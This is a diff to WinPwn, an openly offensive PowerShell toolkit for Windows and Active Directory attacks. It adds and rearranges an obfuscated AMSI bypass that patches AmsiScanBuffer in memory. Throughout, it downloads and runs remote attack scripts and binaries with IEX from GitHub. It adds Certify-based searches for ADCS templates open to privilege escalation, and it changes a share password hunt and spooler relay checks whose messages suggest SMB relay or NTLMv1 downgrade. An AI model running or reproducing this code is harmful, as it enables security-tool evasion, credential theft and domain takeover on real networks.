@@ -20,12 +20,12 @@ Add-Type $ztzsw
 $kgqdegv = [ztzsw]::LoadLibrary("$([CHar](97)+[CHar](109*53/53)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](100*35/35)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c))")
 $dfwxos = [ztzsw]::GetProcAddress($kgqdegv, "$([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72))")
 $p = 0
-[ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
 $qddw = "0xB8"
-$bsyb = "0x57"
-$zcbf = "0x00"
-$ymfa = "0x07"
 $fwyu = "0x80"
+$bsyb = "0x57"
+[ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
+$ymfa = "0x07"
+$zcbf = "0x00"
 $dned = "0xC3"
 $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
 [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)
@@ -1829,29 +1829,35 @@ function Passhunt
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    # P0werspl0its p0werview obfuscated + string replaced
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
-
+    
         if ($domain)
         {
-            Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
-            $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-            $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
+            if (!(Test-Path("$currentPath\DomainRecon\Windows_Servers.txt")))
+            {
+                Searchservers
+            }
 
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
-            Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
-            brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
-             
-            $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
-            $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
-
+            if (!(Test-Path("$currentPath\DomainRecon\found_shares.txt")))
+            {
+                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
+                Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
+                brainstorm -ComputerFile "$currentPath\DomainRecon\Windows_Servers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
+                 
+                $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
+                $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
+                $testShares > "$currentPath\DomainRecon\found_shares.txt"
+            }
+            else
+            {
+                $testShares = Get-Content -Path "$currentPath\DomainRecon\found_shares.txt"
+            }
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
 	    if (!(test-path $currentPath\passhunt.exe))
 	    {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             }
-	    foreach ($line in $shares)
+	    foreach ($line in $testShares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
  -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
@@ -1887,6 +1893,19 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
  -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
         }
+
+}
+
+function Searchservers
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    # P0werspl0its p0werview obfuscated + string replaced
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
+    $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+    $ActiveServers.dnshostname >> "$currentPath\DomainRecon\Windows_Servers.txt"
 
 }
 
@@ -1994,8 +2013,9 @@ __        ___       ____
         Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
         Write-Host -ForegroundColor Green '23. Get the ADCS server(s) and templates + ESC8 Check! '
         Write-Host -ForegroundColor Green '24. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
-        Write-Host -ForegroundColor Green '25. Check the Domain Controllers for LDAP Signing being enforced (experimental)!'
-        Write-Host -ForegroundColor Green '26. Go back '
+        Write-Host -ForegroundColor Green '25. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
+        Write-Host -ForegroundColor Green '26. Enumerate ADCS Template informations and permissions via Certify!'
+        Write-Host -ForegroundColor Green '27. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2026,13 +2046,46 @@ __        ___       ____
          22{Oxidresolver}
          23{ADCSInfos}
          24{Invoke-RBDC-over-DAVRPC}
-         25{Invoke-DCCheckLDAPSigning}
+         25{Invoke-VulnerableADCSTemplates}
+         26{Invoke-ADCSTemplateRecon}
        }
     }
- While ($masterquestion -ne 26)
+ While ($masterquestion -ne 27)
 }
 
-function Invoke-DCCheckLDAPSigning
+function Invoke-ADCSTemplateRecon
+{
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX($Certify)
+
+    Write-Host -ForegroundColor Yellow "Collecting general CA/ADCS informations!"
+    if(!$consoleoutput){Invoke-Certify -Command "cas" >> "$currentPath\DomainRecon\ADCS_Infos.txt"}else{Invoke-Certify -Command "cas"}
+
+    Write-Host -ForegroundColor Yellow "Checking enrolleeSuppliesSubject templates!"
+    if(!$consoleoutput){Invoke-Certify -Command "find /enrolleeSuppliesSubject" >> "$currentPath\DomainRecon\ADCS_enrolleeSuppliesSubject.txt"}else{Invoke-Certify -Command "find /enrolleeSuppliesSubject"}
+
+    Write-Host -ForegroundColor Yellow "Checking templates with Client authentication enabled!"
+    if(!$consoleoutput){Invoke-Certify -Command "find /clientauth" >> "$currentPath\DomainRecon\ADCS_ClientAuthTemplates.txt"}else{Invoke-Certify -Command "find /clientauth"}
+
+    Write-Host -ForegroundColor Yellow "Checking all templates permissions!"
+    if(!$consoleoutput){Invoke-Certify -Command "find /showAllPermissions" >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify -Command "find /showAllPermissions"}
+
+    Write-Host -ForegroundColor Yellow "Enumerate access control information for PKI objects!"
+    if(!$consoleoutput){Invoke-Certify -Command "pkiobjects" >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify -Command "pkiobjects"}
+
+
+    Write-Host -ForegroundColor Yellow "You should check the privileges/groups for enrollment and or for modification rights!"
+
+}
+
+function Invoke-VulnerableADCSTemplates
 {
 
     Param
@@ -2044,49 +2097,8 @@ function Invoke-DCCheckLDAPSigning
 
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
-    IEX($admodule)
-    IEX($SystemDirectoryServicesProtocols)
-    $DCs = Get-ADDomainController
-    foreach ($DC in $DCs)
-    {
-        Write-Host -ForegroundColor Yellow "Checking " + $DC.Name + " over LDAP - 389"
-
-        $ServerName = $DC.Name + "." + $DC.Domain
-        $ServerName
-        $Port = 389
-        $dn = "$ServerName"+":"+"$Port"
-        $c = New-Object System.DirectoryServices.Protocols.LdapConnection $dn
-        $c.SessionOptions.SecureSocketLayer = $false
-        $c.SessionOptions.Signing = $false
-        $c.Bind()
-        if ($c.SessionOptions.Signing)
-        {
-            Write-Host -ForegroundColor Yellow $DC.Name + " set signing back to true, not vulnerable."
-        }
-        else
-        {
-            Write-Host -ForegroundColor Red  $DC.Name + " didnt enforce signing for an LDAP connection and is therefore vulnerable! You can relay HTTP Computer-AUTH (Petitpotam, MS-RPRN) or user authentication to this target!"
-            if(!$consoleoutput){$DC.Name >> "$currentPath\Vulnerabilities\NO_LDAP_Signing.txt"}
-        }
-
-        Write-Host -ForegroundColor Yellow "Checking " + $DC.Name + " over LDAPS - 636"
-
-        $Port = 636
-        $dn = "$ServerName"+":"+"$Port"
-        $d = New-Object System.DirectoryServices.Protocols.LdapConnection $dn
-        $d.SessionOptions.SecureSocketLayer = $true
-        $d.SessionOptions.Signing = $false
-        $d.Bind()
-        if ($d.SessionOptions.Signing)
-        {
-            Write-Host -ForegroundColor Yellow $DC.Name + " set signing back to true, not vulnerable."
-        }
-        else
-        {
-            Write-Host -ForegroundColor Red  $DC.Name + " didnt enforce signing for an LDAP connection and is therefore vulnerable! You can relay HTTP Computer-AUTH (Petitpotam, MS-RPRN) or user authentication to this target!"
-            if(!$consoleoutput){$DC.Name >> "$currentPath\Vulnerabilities\NO_LDAP_Signing.txt"}
-        }
-    }
+    IEX($Certify)
+    if(!$consoleoutput){Invoke-Certify -Command "find /vulnerable" >> "$currentPath\Vulnerabilities\ADCSVulnerableTemplates.txt"}else{Invoke-Certify -Command "find /vulnerable"}
 
 }
 
@@ -2299,7 +2311,7 @@ function Invoke-RBDC-over-DAVRPC
     }
     else
     {
-       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems2.txt")
+       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
         {
             Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
             $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
@@ -2538,7 +2550,7 @@ function Spoolvulnscan
     if (!$exploit)
     {   
         IEX ($viewdevobfs)         
-	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
+	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service!' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
         iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
         $domcontrols = spinster
         
@@ -2549,7 +2561,7 @@ function Spoolvulnscan
 		   	try{
                    if (spoolscan -target $domc)
                    {
-                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
+                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now / or maybe NTLMv1 downgrade (https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)'
                             if(!$consoleoutput){echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"}else{Write-Host -ForegroundColor Red "$domc is vulnerable"}
                    }
 			   }
@@ -2572,7 +2584,7 @@ function Spoolvulnscan
 				    try{
                         	if (spoolscan -target $acserver)
                         	{
-                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now"
+                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the Computer-Account Hash for SMB-Relay attacks / or maybe NTLMv1 downgrade (https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)"
                             		if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"}else{Write-Host "$acserver is vulnerable";$servers += $acserver}
                         	}
 				        }catch{Write-Host "Got an error"}
@@ -4069,7 +4081,11 @@ function Lapschecks
 
 function fruit
 {
-    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
+   $network = Read-Host -Prompt 'Please enter the CIDR for the network: (example: 192.168.0.0/24)'
+   Write-Host -ForegroundColor Yellow 'Searching...'
+   iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1')
+   Find-Fruit -FoundOnly -Rhosts $network
+   pause;    
 }
 
 function Mimiload
@@ -4303,6 +4319,7 @@ WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbel
    
 }
 
+$Certify = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
 $SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
 $viewdevobfs = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
 $admodule = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')
